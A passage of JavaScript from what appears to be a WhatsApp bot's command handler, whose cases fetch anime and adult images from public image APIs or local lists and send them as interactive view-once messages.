          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'goosebird': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animefeed': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeavatar': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'lizardpic': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'catmeow': {
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'anime': {
if (!text) return replygcalya(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await AlyaStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcalya(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${text}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                
                }
                break
case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return AlyaStickGroup()
if (!AntiNsfw) return replygcalya(mess.nsfw)
                await AlyaStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
case 'trap' :{
if (!m.isGroup) return AlyaStickGroup()
if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-neko' :
case 'hneko' :{
if (!m.isGroup) return AlyaStickGroup()
if (!AntiNsfw) return replygcalya(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-waifu' :
case 'nwaifu' :{
if (!m.isGroup) return AlyaStickGroup()
if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gasm':{
if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break  
case 'milf':{
if (!m.isGroup) return AlyaStickGroup()
await AlyaStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var alyaresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:alyaresult.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break 
case 'animespank':{
if (!m.isGroup) return AlyaStickGroup()
if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'blowjob':{
if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var alyaresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:alyaresult.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cuckold':{
if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var alyaresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:alyaresult.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'eba':{
if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var alyaresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:alyaresult.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pussy':{
if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var alyaresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:alyaresult.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'yuri':{
if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var alyaresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:alyaresult.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'zettai':{
if (!m.isGroup) return AlyaStickGroup()
	if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var alyaresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:alyaresult.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gifblowjob':{
if (!m.isGroup) return AlyaStickGroup()
if (!AntiNsfw) return replygcalya(mess.nsfw)
await AlyaStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
